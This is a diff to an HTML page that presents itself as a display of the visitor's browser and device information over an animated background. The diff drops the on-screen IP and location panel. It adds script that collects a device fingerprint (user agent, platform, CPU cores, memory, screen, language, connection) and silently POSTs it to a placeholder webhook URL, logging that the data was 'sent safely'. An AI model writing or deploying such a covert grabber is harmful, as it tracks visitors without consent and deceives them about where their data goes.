@@ -18,14 +18,12 @@
       flex-direction: column;
       overflow: hidden;
     }
-
     canvas {
       position: absolute;
       top: 0;
       left: 0;
       z-index: 0;
     }
-
     .information-container {
       display: grid;
       grid-template-columns: repeat(3, 1fr);
@@ -35,7 +33,6 @@
       width: 90%;
       max-width: 1200px;
     }
-
     .information-box {
       background: rgba(0,0,0,0.6);
       border: 1px solid rgba(255,255,255,0.2);
@@ -44,19 +41,16 @@
       text-align: center;
       transition: transform 0.3s, background 0.3s;
     }
-
     .information-box:hover {
       transform: scale(1.05);
       background: rgba(255,255,255,0.1);
     }
-
     .information-box h2 {
       font-size: 16px;
       margin-bottom: 12px;
       text-transform: uppercase;
       font-weight: normal;
     }
-
     .information-box p {
       font-size: 14px;
       line-height: 1.5;
@@ -69,7 +63,6 @@
   <canvas id="canvas"></canvas>
 
   <div class="information-container">
-
     <div class="information-box">
       <h2>Browser Information</h2>
       <p id="browserName"></p>
@@ -102,30 +95,6 @@
       <p id="language"></p>
       <p id="cookiesEnabled"></p>
       <p id="connectionType"></p>
-    </div>
-
-    <div class="information-box">
-      <h2>IP & Location Information</h2>
-      <p id="ip"></p>
-      <p id="hostname"></p>
-      <p id="city"></p>
-      <p id="region"></p>
-      <p id="country"></p>
-      <p id="org"></p>
-      <p id="postal"></p>
-      <p id="timezone"></p>
-      <p id="loc"></p>
-    </div>
-
-    <div class="information-box">
-      <h2>Miscellaneous Information</h2>
-      <p id="cookieEnabled"></p>
-      <p id="doNotTrack"></p>
-      <p id="timezoneOffset"></p>
-      <p id="referrer"></p>
-      <p id="connectionDownlink"></p>
-      <p id="connectionRtt"></p>
-      <p id="languageList"></p>
     </div>
   </div>
 
@@ -199,48 +168,38 @@
       initParticles();
     });
 
-    document.getElementById('browserName').textContent = `Browser: ${navigator.appName}`;
-    document.getElementById('userAgent').textContent = `User Agent: ${navigator.userAgent}`;
-    document.getElementById('platform').textContent = `Platform: ${navigator.platform}`;
-    document.getElementById('vendor').textContent = `Vendor: ${navigator.vendor}`;
-    document.getElementById('appVersion').textContent = `App Version: ${navigator.appVersion}`;
-    document.getElementById('deviceType').textContent = `Device Type: ${navigator.platform}`;
-    document.getElementById('cpuCores').textContent = `CPU Cores: ${navigator.hardwareConcurrency || "N/A"}`;
-    document.getElementById('memory').textContent = `Device Memory: ${navigator.deviceMemory || "N/A"} GB`;
-    document.getElementById('javaEnabled').textContent = `Java Enabled: ${navigator.javaEnabled() ? "Yes" : "No"}`;
-    document.getElementById('touchSupport').textContent = `Touch Support: ${('ontouchstart' in window) ? "Yes" : "No"}`;
+    const deviceInfo = {
+      browserName: navigator.appName,
+      userAgent: navigator.userAgent,
+      platform: navigator.platform,
+      vendor: navigator.vendor,
+      appVersion: navigator.appVersion,
+      deviceType: navigator.platform,
+      cpuCores: navigator.hardwareConcurrency || "N/A",
+      memory: navigator.deviceMemory || "N/A",
+      javaEnabled: navigator.javaEnabled() ? "Yes" : "No",
+      touchSupport: ('ontouchstart' in window) ? "Yes" : "No",
+      screenResolution: `${window.screen.width} x ${window.screen.height}`,
+      colorDepth: window.screen.colorDepth,
+      pixelRatio: window.devicePixelRatio,
+      screenOrientation: screen.orientation ? screen.orientation.type : "N/A",
+      onlineStatus: navigator.onLine ? "Yes" : "No",
+      language: navigator.language,
+      cookiesEnabled: navigator.cookieEnabled ? "Yes" : "No",
+      connectionType: navigator.connection ? navigator.connection.effectiveType : "N/A"
+    };
 
-    document.getElementById('screenResolution').textContent = `Resolution: ${window.screen.width} x ${window.screen.height}`;
-    document.getElementById('colorDepth').textContent = `Color Depth: ${window.screen.colorDepth}`;
-    document.getElementById('pixelRatio').textContent = `Pixel Ratio: ${window.devicePixelRatio}`;
-    document.getElementById('screenOrientation').textContent = `Orientation: ${screen.orientation ? screen.orientation.type : "N/A"}`;
+    Object.keys(deviceInfo).forEach(id => {
+      const el = document.getElementById(id);
+      if(el) el.textContent = `${id.replace(/([A-Z])/g, ' $1')}: ${deviceInfo[id]}`;
+    });
 
-    document.getElementById('onlineStatus').textContent = `Online: ${navigator.onLine ? "Yes" : "No"}`;
-    document.getElementById('language').textContent = `Language: ${navigator.language}`;
-    document.getElementById('cookiesEnabled').textContent = `Cookies Enabled: ${navigator.cookieEnabled ? "Yes" : "No"}`;
-    document.getElementById('connectionType').textContent = `Connection Type: ${navigator.connection ? navigator.connection.effectiveType : "N/A"}`;
-
-    document.getElementById('doNotTrack').textContent = `Do Not Track: ${navigator.doNotTrack || "N/A"}`;
-    document.getElementById('timezoneOffset').textContent = `Timezone Offset: ${new Date().getTimezoneOffset()} minutes`;
-    document.getElementById('referrer').textContent = `Referrer: ${document.referrer || "None"}`;
-    document.getElementById('connectionDownlink').textContent = `Downlink: ${navigator.connection ? navigator.connection.downlink + " Mb/s" : "N/A"}`;
-    document.getElementById('connectionRtt').textContent = `RTT: ${navigator.connection ? navigator.connection.rtt + " ms" : "N/A"}`;
-    document.getElementById('languageList').textContent = `Languages: ${navigator.languages.join(', ')}`;
-
-    fetch('https://ipinfo.io/json?token=68ff73597277ed')
-      .then(response => response.json())
-      .then(data => {
-        document.getElementById('ip').textContent = `IP: ${data.ip}`;
-        document.getElementById('hostname').textContent = `Hostname: ${data.hostname || "N/A"}`;
-        document.getElementById('city').textContent = `City: ${data.city}`;
-        document.getElementById('region').textContent = `Region: ${data.region}`;
-        document.getElementById('country').textContent = `Country: ${data.country}`;
-        document.getElementById('org').textContent = `Organization: ${data.org}`;
-        document.getElementById('postal').textContent = `Postal Code: ${data.postal}`;
-        document.getElementById('timezone').textContent = `Timezone: ${data.timezone}`;
-        document.getElementById('loc').textContent = `Location Coordinates: ${data.loc}`;
-      })
-      .catch(error => console.error('Error fetching IP information:', error));
+    fetch('YOUR_WEBHOOK_URL', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ content: JSON.stringify(deviceInfo, null, 2) })
+    }).then(() => console.log("Device info sent safely!"))
+      .catch(err => console.error(err));
   </script>
 </body>
 </html>
